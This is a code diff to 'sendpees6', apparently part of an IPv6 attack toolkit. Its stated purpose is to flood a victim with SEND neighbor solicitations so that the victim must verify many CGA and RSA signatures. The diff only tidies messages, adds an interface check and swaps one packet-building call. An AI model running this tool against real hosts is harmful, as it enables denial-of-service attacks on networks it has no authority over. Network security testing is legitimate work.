@@ -31,12 +31,16 @@ int main(int argc, char **argv) {
 
   if (argc != 5) {
     printf("sendpees6 by willdamn <willdamn@gmail.com>\n\n");
-    printf("usage: %s <inf> <key_length> <prefix> <victim>\n\n", argv[0]);
+    printf("Syntax: %s interface key_length prefix victim\n\n", argv[0]);
     printf("Send SEND neighbor solicitation messages and make target to verify a lota CGA and RSA signatures\n\n");
     exit(1);
   }
 
   dev = argv[1];
+  if (thc_get_own_ipv6(dev, NULL, PREFER_LINK) == NULL) {
+    fprintf(stderr, "Error: invalid interface %s\n", dev);
+    exit(-1);
+  }
 
   memcpy(addr, argv[3], 50);
   inet_pton(PF_INET6, addr, &addr6);
@@ -60,7 +64,7 @@ int main(int argc, char **argv) {
   dummy[17] = 1;
   memcpy(dummy, dst6, 16);
 
-  if ((pkt = thc_create_ipv6(dev, PREFER_GLOBAL, &pkt_len, cga, dst6, 0, 0, 0, 0, 0)) == NULL) {
+  if ((pkt = thc_create_ipv6_extended(dev, PREFER_GLOBAL, &pkt_len, cga, dst6, 0, 0, 0, 0, 0)) == NULL) {
     printf("Cannot create IPv6 header\n");
     exit(1);
   }
@@ -71,7 +75,7 @@ int main(int argc, char **argv) {
   free(cga_opt);
 
   if (thc_generate_pkt(dev, srchw, dsthw, pkt, &pkt_len) < 0) {
-    fprintf(stderr, "Couldn't generate ipv6 packet!\n");
+    fprintf(stderr, "Couldn't generate IPv6 packet!\n");
     exit(1);
   }
 
